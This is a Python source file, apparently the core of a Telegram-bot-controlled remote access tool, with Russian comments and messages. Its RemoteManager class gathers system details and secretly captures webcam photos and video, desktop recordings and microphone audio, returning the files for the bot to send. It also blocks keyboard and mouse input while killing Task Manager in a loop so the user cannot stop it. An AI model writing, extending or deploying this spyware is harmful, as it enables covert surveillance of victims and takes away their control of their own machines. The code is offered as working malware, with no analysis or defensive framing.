import getpass
import threading
import keyboard
from time import sleep
import wave

import wmi
import cv2
import numpy as np
import pyaudio
import pyautogui
import pyttsx3
from aiogram import types
import psutil

from pynput.mouse import Controller


class RemoteManager:
    def __init__(self, bot):
        self.bot = bot
        self.USER_NAME = getpass.getuser()
        self.width, self.height = pyautogui.size()
        self.block_input_flag = False

    def get_info(self):
        computer = wmi.WMI()
        computer_info = computer.Win32_ComputerSystem()[0]
        os_info = computer.Win32_OperatingSystem()[0]
        proc_info = computer.Win32_Processor()[0]
        gpu_info = computer.Win32_VideoController()[0]
        os_name = os_info.Name.encode('cp866').split(b'|')[0]
        os_version = ' '.join([os_info.Version, os_info.BuildNumber])
        system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB

        result = f"OS Name: {os_name} \n" \
                 f"OS Version: {os_version} \n" \
                 f"CPU: {proc_info.Name} \n" \
                 f"RAM: {system_ram} GB \n" \
                 f"Graphics Card: {gpu_info.Name}"

        print(result)

    async def say_text(self, text):
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()

    def blockinput(self):
        if not self.block_input_flag:
            self.block_input_flag = True
            t1 = threading.Thread(target=self.blockinput_start)
            t1.start()

            result = "Ввод заблокирован!"
        else:
            result = "Уже заблокировано!"

        return result

    def blockinput_stop(self):
        if self.block_input_flag:
            for i in range(150):
                keyboard.unblock_key(i)
            self.block_input_flag = False

            result = "Ввод разблокирован"
        else:
            result = "Ввод уже разблокирован"

        return result

    def blockinput_start(self):
        mouse = Controller()
        for i in range(150):
            keyboard.block_key(i)
        while self.block_input_flag:
            for proc in psutil.process_iter():
                mouse.position = (0, 0)
                if proc.name().lower() == 'taskmgr.exe':
                    proc.terminate()

    def make_cam_photo(self):
        cap = cv2.VideoCapture(0)

        # Check if the webcam is opened correctly
        if not cap.isOpened():
            res = "Error! No access to cam"

        ret, frame = cap.read()
        # уменьшить в 2 раза
        frame = cv2.resize(frame, None, fx=0.5, fy=0.5, interpolation=cv2.INTER_AREA)
        cv2.imwrite("screen_camera.png", frame)

        cap.release()
        cv2.destroyAllWindows()

    def make_cam_video(self, time):
        # умножать на кол-во кадров в секунду
        time_converted = time * 20

        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            return "Ошибка! Веб-камера выключена, либо она отсутствует."

        cap.set(cv2.CAP_PROP_FPS, 20)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)

        codec = cv2.VideoWriter_fourcc(*'MJPG')
        out = cv2.VideoWriter('webvideo.avi', codec, 20, (640, 480))

        frames = 0
        while True:
            ret, frame = cap.read()
            out.write(frame)

            sleep(0.03)
            frames += 1
            if frames > time_converted:
                break

        out.release()
        cap.release()
        cv2.destroyAllWindows()

        return types.InputFile(path_or_bytesio='webvideo.avi')

    def make_desktop_video(self, duration):
        # умножать на кол-во кадров в секунду
        time_converted = duration * 20

        codec = cv2.VideoWriter_fourcc(*'MJPG')
        out = cv2.VideoWriter('deskvideo.avi', codec, 20, (self.width, self.height))

        frames = 0
        while True:

            image = pyautogui.screenshot(region=(0, 0, self.width, self.height))
            frame = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
            out.write(frame)
            frames += 1
            print("Кадр")
            if frames > time_converted:
                break

        out.release()
        cv2.destroyAllWindows()

        return types.InputFile(path_or_bytesio='deskvideo.avi')

    def make_audiofile_from_micro(self, time):
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        CHUNK = 1024
        WAVE_OUTPUT_FILENAME = "../file.wav"

        audio = pyaudio.PyAudio()

        stream = audio.open(format=FORMAT, channels=CHANNELS,
                            rate=RATE, input=True,
                            frames_per_buffer=CHUNK)

        frames = []
        for i in range(0, int(RATE / CHUNK * time)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        audio.terminate()

        waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        waveFile.setnchannels(CHANNELS)
        waveFile.setsampwidth(audio.get_sample_size(FORMAT))
        waveFile.setframerate(RATE)
        waveFile.writeframes(b''.join(frames))
        waveFile.close()

        return types.InputFile(path_or_bytesio='../file.wav')
